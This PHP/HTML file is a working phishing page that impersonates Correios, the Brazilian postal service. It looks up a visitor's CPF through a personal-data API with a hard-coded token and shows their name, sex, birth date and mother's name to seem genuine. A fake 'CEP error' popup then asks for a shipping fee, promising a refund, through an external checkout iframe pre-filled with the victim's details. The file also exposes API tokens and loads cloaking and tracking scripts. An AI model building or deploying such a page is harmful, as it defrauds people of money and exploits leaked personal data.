<?php
include('./protect.php');
$checkout = "https://www.pay-pagamentos.link//checkout/2aa9a1ce-e4da-422c-afd8-02fe6d9caa15";

if(isset($_GET['cpf']) && !empty($_GET['cpf'])){
	$cpf = $_GET['cpf'];
	if(isset($_GET['email']) && !empty($_GET['email'])){
		$email = $_GET['email'];
	};
	if(isset($_GET['telefone']) && !empty($_GET['telefone'])){
		$phone = $_GET['telefone'];
	};

	//$url = "https://buscafamiliar.online/api/?usuario=1c69d80906d70442928f9b37d2dbc664&api=cpf&cpf=".$cpf.""; // api de dados
	$url = "https://app.konsulta.pro/api/pessoa?cpf=".$cpf."";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_ENCODING,  'deflate');
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');

	curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'token: 9b9e0838a86a4c569f722e713a6739fb'
    ]);

	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);

	$result = curl_exec($ch);

	$hotfix_pos = strpos($result, '{');
	$result = substr($result, $hotfix_pos);

	$result = json_decode($result, true);
	if (curl_errno($ch)) {
		echo 'Erro:' . curl_error($ch);
	};
	curl_close($ch);

	$nome = $result['nome'];
	$checkout = $checkout . "?cpf=" . $cpf . "&nome=" . $nome . "&email=" . $email . "&telefone=" . $phone;
};

?>
<html lang="pt"><head>
    
   <script>
      window.pixelId = "689148f595f880da90db05c2";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script> 
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>Correios | Suas encomendas</title>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="css/popup.css">
    <link rel="stylesheet" href="css/fonts.css">
    <link rel="stylesheet" href="./css/protect.css">
	<link rel="icon" type="image/x-icon" href="./images/correios-icon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
</head>
<body>
    <script type="text/javascript" async="" src="https://s1.kwai.net/kos/s101/nlav11187/pixel/core/checkPixel.js?sdkid=248586490053502&amp;lib=kwaiq"></script><script type="text/javascript" async="" src="https://s1.kwai.net/kos/s101/nlav11187/pixel/core/core.js?sdkid=248586490053502&amp;lib=kwaiq"></script><script type="text/javascript" async="" src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid=248586490053502&amp;lib=kwaiq"></script><script>
        !function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"https://s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.js"+c)}}(window,document,"kwaiq")}])}));
        </script>
        <script>
        kwaiq.load('248586490053502');
        kwaiq.page();
        </script>   
    <script src="https://configuracaosites.tech/kwai-track/latest.js" async="" defer=""></script>
    <nav class="navbar">
        <div class="logo-central">
			<img src="./images/correios.png">
        </div>
    </nav>
    <div id="ad1">
        <div class="ad1">
            <div style="margin: 0 15px;">
				<button class="styled-button" style="padding-top: 20px;">
					<div class="icon-container">
                            <span class="material-symbols-outlined">check</span>
                        </div><span class="button-text">
                    <p style="margin-left: 5%;font-family: 'GellixMedium';font-size: 22px;color: rgb(0,49,87);">Confirme os dados de envio de seu pedido:</p></span>
				</button>
                        <p id="setar" style="color: rgb(47, 72, 91);margin-top: 0;text-align: center;margin-left: 3%;margin-right: 3%; font-weight: normal;">Carregando...</p>
                <div class="button-container" style="padding-bottom: 20px;">
                    <button class="styled-button2" onclick="showPopup()">
                        <span class="button-text">
                            <span class="button-title2">Confirmar</span>
                        </span>
                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                    </button>
                </div>
            </div>
        </div>
    </div>
	<!-- Popup (inicialmente oculta) -->
	<div id="popup" class="popup-container">
		<div class="popup-content" id="carregamento">
			<h2 class="carregamento-title">Confirmando seus dados</h2>
			<p class="carregamento-subtitle">Por favor aguarde</p>
			<div class="progress-bar">
				<div class="progress"></div>
			</div>
		</div>
		<div class="popup-content" id="popup-finish">
			<h2 class="popup-title erro-cep"><img src="./images/warning.png" style="width:40px">ERRO NO CEP</h2>
			<p class="popup-subtitle">Detectamos um pequeno erro no cálculo do frete para a sua região.</p>
			<p class="popup-text">Para que possamos enviar seu pedido o mais rápido possível, será necessário ajustar o valor do frete.
O valor pago inicialmente será reembolsado automaticamente.</p>
			<button class="popup-button" style="display: inline-block; font-weight: bold;" onclick="abrirIframeCheckout()">PAGAR FRETE</button>
			<span class="observacao-botao">Clique no botão para continuar</span>
		</div>
	</div>
	<script>
		function openNewWindowWithUTMs(url) {
			// Extract the current URL's query parameters
			const currentUrlParams = new URLSearchParams(window.location.search);
			let utms = '';

			// Build the string of UTM parameters
			for (let [key, value] of currentUrlParams.entries()) {
				if (key.startsWith('utm_')) {  // Ensure it only adds UTM parameters
					utms += `${key}=${value}&`;
				}
			}

			// Remove the last '&' if any UTM parameters were added
			if (utms) {
				utms = utms.slice(0, -1); // remove the last '&'
			}

			// Check if the target URL already has query parameters
			let separator = url.includes('?') ? '&' : '?';

			// Append UTM parameters to the URL
			const fullUrl = url + (utms ? separator + utms : '');

			// Open the new window with the full URL containing UTM parameters
			window.open(fullUrl, '_blank');
		}
	</script>
    <script src="js/scripts.js"></script>
    <script>
        const queryParams = new URLSearchParams(window.location.search);
        const cpf = queryParams.get('cpf');
        const user = {};

        function renderData() {
            if (user.name && user.sex && user.birthdate) {
                let htmlContent = `
                    Nome: <b>${user.name}</b><br>
                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
                    Data de nascimento: <b>${user.birthdate}</b>`;
                if (user.mother && user.mother !== "0") {
                    htmlContent += `<br>Nome da mãe: <b>${user.mother}</b>`;
                }
                document.getElementById('setar').innerHTML = htmlContent;
            } else {
                document.getElementById('setar').innerHTML = `Carregando...`;
            }
        }

        fetch('https://app.konsulta.pro/api/pessoa?cpf=' + cpf, {
            headers: {
                'token': '9b9e0838a86a4c569f722e713a6739fb'
            }
        })
            .then(response => response.json())
            .then(data => {
                user.name = data.nome;
                user.sex = data.sexo;
                user.cpf = data.cns;
                user.mother = data.mae;
                user.birthdate = data.nascimento;
                renderData();
            })
            .catch(error => {
                console.error('Erro ao fazer a solicitação:', error);
            });
    </script>
    <script src="./js/protect.js"></script>
    
<div id="iframe-modal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); z-index:9999;">
  <iframe id="iframe-checkout" src="" width="100%" height="100%" frameborder="0" style="border:none;"></iframe>
</div>



<script>
  function abrirIframeCheckout() {
    const iframe = document.getElementById('iframe-checkout');
    const modal = document.getElementById('iframe-modal');
    const checkoutUrl = "<?php echo $checkout; ?>";
    iframe.src = checkoutUrl;
    modal.style.display = "block";
  }
</script>




</body></html>
